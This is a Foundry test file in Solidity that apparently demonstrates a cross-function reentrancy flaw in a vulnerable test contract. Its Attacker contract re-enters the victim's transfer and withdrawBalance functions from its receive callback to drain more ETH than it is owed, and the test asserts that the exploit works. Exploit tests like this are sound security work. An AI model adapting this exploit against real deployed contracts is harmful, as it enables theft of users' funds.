
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {Reentrancy_cross_function} from "../src/Reentrancy_cross_function.sol";

contract TestReentrancyReentrancy_cross_function is Test {
    using stdStorage for StdStorage;

    Reentrancy_cross_function public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_cross_function();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // Set up the attacker's balance in the victim contract using storage manipulation
        // userBalances is at slot 0 (first state variable)
        bytes32 attackerBalanceSlot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), attackerBalanceSlot, bytes32(attackVal));

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_cross_function public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = Reentrancy_cross_function(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        storedAttackVal = val;

        // 2. Call the vulnerable function
        victim.withdrawBalance();

        // 3. Verify Success Conditions
        // The attack is successful if:
        // - We received more than our entitled balance (val)
        // - The victim lost more than val
        uint256 finalVictimBalance = address(victim).balance;
        uint256 amountDrained = initialVictimBalance - finalVictimBalance;
        
        // If we drained more than our initial balance entitlement, reentrancy succeeded
        if (amountDrained > storedAttackVal && attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter by calling transfer to move balance to ourselves before state is reset
            // This exploits cross-function reentrancy: transfer reads stale userBalances
            victim.transfer(address(this), storedAttackVal);
            // Now withdraw again with the transferred balance
            victim.withdrawBalance();
        }
    }
}
